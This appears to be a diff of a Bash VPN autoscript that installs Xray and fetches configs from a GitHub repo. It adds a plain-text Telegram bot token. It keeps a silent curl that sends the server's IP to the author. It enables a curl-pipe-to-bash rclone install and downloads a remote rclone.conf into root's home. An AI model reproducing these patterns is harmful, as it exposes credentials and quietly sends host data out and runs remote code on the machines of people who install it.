@@ -19,6 +19,8 @@ GRAY="\e[1;30m"
 NC='\e[0m'
 
 # // configuration GET | ~/.MRG YAHYA AUTOSCRIPT
+CHATID="1870008234"
+KEY="6290926912:AAHHNhTY8h056-IGG07nyRopgeFNU3cr4LA"
 TIMES="10"
 NAMES=$(whoami)
 IMP="wget -q -O"
@@ -29,6 +31,7 @@ TIME=$(date +'%Y-%m-%d %H:%M:%S')
 RAMMS=$(free -m | awk 'NR==2 {print $2}')
 REGAN="https://api.telegram.org/bot6290926912:AAHHNhTY8h056-IGG07nyRopgeFNU3cr4LA/sendMessage?chat_id=1870008234&text=DAFTAR+$MYIP"
 curl $REGAN >/dev/null 2>&1
+URL="https://api.telegram.org/bot$KEY/sendMessage"
 OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')
 
 secs_to_human() {
@@ -346,10 +349,9 @@ function install_xray() {
     xraycore_link="https://github.com/XTLS/Xray-core/releases/download/v1.5.9/xray-linux-64.zip"
     bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version >/dev/null 2>&1
     judge "Core Xray $latest_version Version installed successfully"
-    #curl https://rclone.org/install.sh | bash >/dev/null 2>&1
-    #printf "q\n" | rclone config
-    #-e "n"
-    #wget -O /root/.config/rclone/rclone.conf https://github.com/Rega23/mrg/raw/main/RCLONE%2BBACKUP-Gdrive/rclone.conf >/dev/null 2>&1
+    curl https://rclone.org/install.sh | bash >/dev/null 2>&1
+    printf "q\n" | rclone config  >/dev/null 2>&1
+    wget -O /root/.config/rclone/rclone.conf https://github.com/Rega23/mrg/raw/main/RCLONE%2BBACKUP-Gdrive/rclone.conf >/dev/null 2>&1
     wget -O /etc/xray/config.json https://github.com/Rega23/mrg/raw/main/VMess-VLESS-Trojan%2BWebsocket%2BgRPC/config.json >/dev/null 2>&1
     wget -O /usr/bin/ws https://github.com/Rega23/mrg/raw/main/fodder/websocket/ws >/dev/null 2>&1
     wget -O /usr/bin/tun.conf https://github.com/Rega23/mrg/raw/main/fodder/websocket/tun.conf >/dev/null 2>&1
